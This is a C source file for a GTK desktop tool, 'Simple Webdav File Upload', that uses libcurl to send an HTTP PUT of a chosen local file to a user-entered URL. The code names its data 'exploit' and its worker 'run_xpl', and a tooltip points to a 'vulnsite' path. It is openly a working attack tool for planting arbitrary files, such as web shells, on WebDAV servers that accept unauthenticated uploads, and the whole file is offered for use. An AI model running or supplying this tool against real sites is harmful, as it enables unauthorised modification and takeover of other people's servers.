// by MMxM (@hc0d3r) [hc0der.blogspot.com]
// gcc webdavGUI.c -o webdavGUI $(pkg-config --libs --cflags gtk+-2.0) -lcurl

#include <pthread.h>
#include <gtk/gtk.h>
#include <curl/curl.h>
#include <malloc.h>
#include <stdio.h>

static volatile int running = 0;

typedef struct {
	GtkWidget *entry1;
	GtkWidget *entry2;
	GtkWidget *label4;
} exploit;

void change_label_color(GtkWidget *widget, const char *colord){
	GdkColor color;
        gdk_color_parse(colord,&color);
        gtk_widget_modify_fg(widget, GTK_STATE_NORMAL, &color);
	return;
}

void *run_xpl(void *data){
	exploit *args = (exploit *)data;
	FILE *fd;
	CURL *curl;
	CURLcode res;
	curl_off_t filesize;
	long http_code;
	char *msg;

	gdk_threads_enter();
	change_label_color(args->label4,"DarkGreen");
	gtk_label_set_text(GTK_LABEL(args->label4),"Making PUT Request...");
	gdk_threads_leave();


	fd = fopen(gtk_entry_get_text(GTK_ENTRY(args->entry2)),"r");

	if(fd == NULL){
		gdk_threads_enter();
		change_label_color(args->label4,"red");
		gtk_label_set_text(GTK_LABEL(args->label4),"Error while open file...");
		gdk_threads_leave();
		running = 0;
		pthread_exit((void *) 0);
	}

	curl = curl_easy_init();

	if(!curl){
		fclose(fd);
		gdk_threads_enter();
		change_label_color(args->label4,"red");
		gtk_label_set_text(GTK_LABEL(args->label4),"curl_easy_init()\nError !!!");
		gdk_threads_leave();
		running = 0;
		pthread_exit((void *) 0);
	}

	fseek(fd, 0L, SEEK_END);
	filesize = (curl_off_t)ftell(fd);
	fseek(fd, 0L, SEEK_SET);


	curl_easy_setopt(curl, CURLOPT_URL, gtk_entry_get_text(GTK_ENTRY(args->entry1)));
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
	curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
	curl_easy_setopt(curl, CURLOPT_READDATA, fd);
	curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,filesize);
	curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

	res = curl_easy_perform(curl);
	curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
	curl_easy_cleanup(curl);
	fclose(fd);

	if(res != CURLE_OK){
		gdk_threads_enter();
		change_label_color(args->label4,"red");
		gtk_label_set_text(GTK_LABEL(args->label4),"curl_easy_perform()\nError !!!");
		gdk_threads_leave();
		running = 0;
		pthread_exit((void *) 0);
	}

	msg = malloc(25+sizeof(long)+1);
	snprintf(msg,malloc_usable_size(msg)-1,"Site return %ld\nhttp code !",http_code);

	gdk_threads_enter();
	gtk_label_set_text(GTK_LABEL(args->label4),msg);
	gdk_threads_leave();

	free(msg);

	running = 0;
	pthread_exit((void *) 0);

}


void start_run(GtkWidget *widget, void *args){
	if(running) return;
	pthread_t handle;
	pthread_create(&handle,NULL,run_xpl,args);
	pthread_detach(handle);
	running = 1;
	return;
}

void update_entry(GtkWidget *widget , GtkWidget *widget2){
	if(running) return;
	GtkWidget *dialog;

	dialog = gtk_file_chooser_dialog_new ("Choose File",
		NULL,
		GTK_FILE_CHOOSER_ACTION_OPEN,
		GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL,
		GTK_STOCK_OPEN, GTK_RESPONSE_ACCEPT,
		NULL);


	if(gtk_dialog_run (GTK_DIALOG (dialog)) == GTK_RESPONSE_ACCEPT)
		gtk_entry_set_text(GTK_ENTRY(widget2),gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(dialog)));


	gtk_widget_destroy(dialog);

	return;
}

gboolean open_link(GtkAboutDialog *label, gchar *uri, gpointer h){
	GError *error = NULL;
	gtk_show_uri(NULL,uri,GDK_CURRENT_TIME,&error);
	if(error){
		g_print("WARN: %s\n",error->message);
		g_error_free(error);
		return FALSE;
	}
	return TRUE;
}

void show_about_box(void){
	GtkWidget *about_box;
	const gchar *x[]= { "C0der: MMxM (@hc0d3r)",NULL };
	about_box = gtk_about_dialog_new();
	gtk_about_dialog_set_program_name(GTK_ABOUT_DIALOG(about_box),"Simple Webdav File Upload");
	gtk_about_dialog_set_version(GTK_ABOUT_DIALOG(about_box),"v0.1");
	gtk_about_dialog_set_authors(GTK_ABOUT_DIALOG(about_box),x);
	gtk_about_dialog_set_website(GTK_ABOUT_DIALOG(about_box),"http://hc0der.blogspot.com.br/");
	gtk_about_dialog_set_website_label(GTK_ABOUT_DIALOG(about_box),"My Blog =)");
	gtk_about_dialog_set_copyright(GTK_ABOUT_DIALOG(about_box),"Copyright MMxM \\('-\\')");

	g_signal_connect(G_OBJECT(about_box), "activate-link", G_CALLBACK(open_link), NULL);
	g_signal_connect(G_OBJECT(about_box), "destroy", G_CALLBACK(gtk_widget_destroy), NULL);

	gtk_dialog_run(GTK_DIALOG(about_box));
	gtk_widget_destroy(about_box);

	return;
}

int main(int argc, char **argv){
	GtkWidget *window;
	GtkWidget *bt1, *bt2, *bt3;
	GtkWidget *layout;
	GtkWidget *label1, *label2, *label3;
	GtkTooltips *tooltip;

	exploit entrys;

	g_thread_init(NULL);
	gdk_threads_init();
	gdk_threads_enter();

	gtk_init( &argc, &argv );

	window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
	gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
	gtk_widget_set_size_request (window, 380, 143); // 165
	gtk_window_set_resizable(GTK_WINDOW(window), FALSE);
	gtk_window_set_title(GTK_WINDOW(window), "Simple Webdav File Upload | C0d3r: MMxM");

	label1 = gtk_label_new("Site:");
	label2 = gtk_label_new("File:");
	label3 = gtk_label_new("Status:");
	entrys.label4 = gtk_label_new("Stop !");

	change_label_color(entrys.label4,"red");

	entrys.entry1 = gtk_entry_new();
	gtk_widget_set_size_request(entrys.entry1, 200, 26);

	tooltip = gtk_tooltips_new();
	gtk_tooltips_set_tip(tooltip, entrys.entry1, "example:vulnsite/path/new_file.txt",NULL);

	entrys.entry2 = gtk_entry_new();
	gtk_widget_set_size_request(entrys.entry2, 150, 26);

	bt1 = gtk_button_new_with_label("...");
	gtk_widget_set_size_request(bt1, 45, 26);

	bt2 = gtk_button_new_with_label("Upload !!!");
	gtk_widget_set_size_request(bt2,110,54);

	bt3 = gtk_button_new_from_stock("gtk-about");
	gtk_widget_set_size_request(bt3,110,54);

	layout = gtk_layout_new (NULL, NULL);
	gtk_container_add(GTK_CONTAINER(window), layout);


	gtk_layout_put(GTK_LAYOUT(layout), label1, 10, 17);
	gtk_layout_put(GTK_LAYOUT(layout), label2, 10, 48);
	gtk_layout_put(GTK_LAYOUT(layout), label3, 10, 92);
	gtk_layout_put(GTK_LAYOUT(layout), entrys.label4, 80, 92);

	gtk_layout_put(GTK_LAYOUT(layout), entrys.entry1, 50,15);
	gtk_layout_put(GTK_LAYOUT(layout), entrys.entry2, 50,46);

	gtk_layout_put(GTK_LAYOUT(layout), bt1, 205, 46);
	gtk_layout_put(GTK_LAYOUT(layout), bt2, 260, 15);
	gtk_layout_put(GTK_LAYOUT(layout), bt3, 260, 74);

	g_signal_connect(G_OBJECT(window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
	g_signal_connect(G_OBJECT(bt1), "clicked", G_CALLBACK(update_entry), entrys.entry2);
	g_signal_connect(G_OBJECT(bt2), "clicked", G_CALLBACK(start_run), &entrys);
	g_signal_connect(G_OBJECT(bt3), "clicked", G_CALLBACK(show_about_box), 0);

	gtk_widget_show_all(window);

	gtk_main();
	gdk_threads_leave();

	return 0;
}
